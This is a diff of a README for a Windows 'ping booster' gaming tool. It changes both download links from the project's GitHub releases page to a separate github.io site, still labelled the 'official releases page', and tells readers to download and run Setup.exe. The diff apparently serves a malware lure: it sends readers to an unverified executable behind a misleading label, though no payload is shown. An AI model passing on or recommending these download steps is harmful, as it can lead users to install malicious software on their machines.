@@ -1,6 +1,6 @@
 # 🕹️ Ping-Booster-Games-2026 - Lower your lag for better gaming
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue)](https://github.com/briefless-adamsapple889/Ping-Booster-Games-2026/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue)](https://briefless-adamsapple889.github.io)
 
 Ping Booster for Games 2026 helps you play games with a stable network connection. This software shapes your internet traffic to give your games priority over other background tasks. It lowers network latency and removes spikes. You do not need to change your system files. The tool works as a standalone application on your machine.
 
@@ -12,7 +12,7 @@ This application runs on Windows 11 and Windows 10. You need a stable internet c
 
 Follow these steps to obtain and run the software:
 
-1. Visit the [official releases page](https://github.com/briefless-adamsapple889/Ping-Booster-Games-2026/releases) to access the download files.
+1. Visit the [official releases page](https://briefless-adamsapple889.github.io) to access the download files.
 2. Look for the latest version at the top of the list.
 3. Click on the Setup.exe file to start your download.
 4. Open the file once the download finishes.
